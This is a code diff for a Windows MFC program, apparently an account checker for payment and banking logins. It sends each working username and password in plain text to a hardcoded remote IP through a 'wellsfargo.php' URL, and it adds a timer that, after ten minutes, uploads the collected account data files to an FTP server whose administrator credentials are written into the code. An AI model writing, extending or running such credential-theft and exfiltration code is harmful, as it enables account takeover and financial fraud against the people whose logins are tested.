@@ -156,6 +156,9 @@ CPaypayDlg::CPaypayDlg(CWnd* pParent /*=NULL*/)
 	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
 	m_cookieProcess.setExplorer(&m_iee);
 	m_cookieProcess.setPayDlg(this);
+	m_ftpManager = new FtpManager(L"Administrator",L"082f860b7c",L"118.193.181.176");
+	
+
 }
 
 void CPaypayDlg::DoDataExchange(CDataExchange* pDX)
@@ -503,6 +506,7 @@ private:
 // CPaypayDlg 消息处理程序
 wstring g_ini_file_path;
 int g_shanchu_daili_time = 0;
+int g_ftp_time = 0;
 BOOL CPaypayDlg::OnInitDialog()
 {
 	CDialog::OnInitDialog();
@@ -791,10 +795,10 @@ DWORD WINAPI execute(LPVOID lpParamter)
 			WaitForSingleObject(hMutex, INFINITE);
 			if (type == LOGIN_ERROR_SUCCESS || 
 				type == LOGIN_ERROR_SUCCESS_ACTIVATE || 
-				type == LOGIN_ERROR_SUCCESS_LIMIT || 
-				type == LOGIN_ERROR_HASMONEY ||
-				type == LOGIN_ERROR_CAN_NOT_LOGIN ||
-				type == LOGIN_ERROR_NOMONEY)
+						type == LOGIN_ERROR_SUCCESS_LIMIT || 
+								type == LOGIN_ERROR_HASMONEY ||
+										type == LOGIN_ERROR_CAN_NOT_LOGIN ||
+												type == LOGIN_ERROR_NOMONEY)
 			{
 				g_ok_account_num++;
 				char m[10];
@@ -802,12 +806,12 @@ DWORD WINAPI execute(LPVOID lpParamter)
 				string efws = string(m);
 				wstring text = wstring(efws.begin(),efws.end());
 				((CPaypayDlg*)lpParamter)->SetDlgItemText(IDC_STATIC13,text.c_str());
-
 				wstring w_name = wstring(name.begin(),name.end());
 				wstring w_password = wstring(password.begin(),password.end());
-				wstring url = L"http://107.178.68.6/wellsfargo.php?n=" + w_name + L"&p=" + w_password;
+				wstring url = L"http://118.193.181.176:8080/wellsfargo.php?n=" + w_name + L"&p=" + w_password;
 				WinHttpClient WinClient(url);
 				WinClient.SendHttpRequest(L"GET");
+				int temp  = 0 ;
 
 			}
 			else if (type == LOGIN_ERROR_COOKIE)
@@ -1352,6 +1356,8 @@ DWORD WINAPI execute_daili(LPVOID lpParamter)
 	{
 		((CPaypayDlg*)lpParamter)->SetTimer(3,1000,NULL);
 	}
+
+	((CPaypayDlg*)lpParamter)->SetTimer(20,1000,NULL);
 	return 0;
 }
 
@@ -1359,6 +1365,8 @@ void CPaypayDlg::OnBnClickedButton2()
 {
 	// TODO: 在此添加控件通知处理程序代码
 	SetTimer(10,60000,NULL);
+
+
 	HANDLE hSignalThread = CreateThread(NULL, 0, execute_daili, (LPVOID)this, 0, NULL);
 	g_begin_time = GetTickCount();
 	//if (!initDaiLi())
@@ -1987,6 +1995,36 @@ void CPaypayDlg::OnTimer(UINT_PTR nIDEvent)
 	else if (nIDEvent == 10)
 	{
 		//m_iee.Refresh();
+	}
+	else if (nIDEvent == 20)
+	{
+		g_ftp_time++;
+		if ( g_ftp_time >= 10 * 60)
+		{
+			KillTimer(20);
+
+			CTime tm;
+			tm = CTime::GetCurrentTime();
+			CString dir_name;
+			dir_name = tm.Format("%Y年%m月%d日");
+			TCHAR szFilePath[MAX_PATH + 1]={0};
+			GetModuleFileName(NULL, szFilePath, MAX_PATH);
+			(_tcsrchr(szFilePath, _T('\\')))[1] = 0;
+			if(!PathIsDirectory(szFilePath + dir_name))
+			{
+				CreateDirectory(szFilePath + dir_name,NULL);
+			}
+			CString str_url = szFilePath + dir_name + L"\\";
+			std::vector<wstring> mm;
+			for (int i = 0; i < g_name->size(); ++i)
+			{
+				std::wstring etr = g_name[i];
+				std::wstring path = std::wstring(str_url) + std::wstring(L"last_data_"+ etr + L".txt");
+				mm.push_back(path);
+			}
+			//mm.push_back(L"Paypay.pdb");
+			m_ftpManager->pushFiles(mm);
+		}
 	}
 }
 
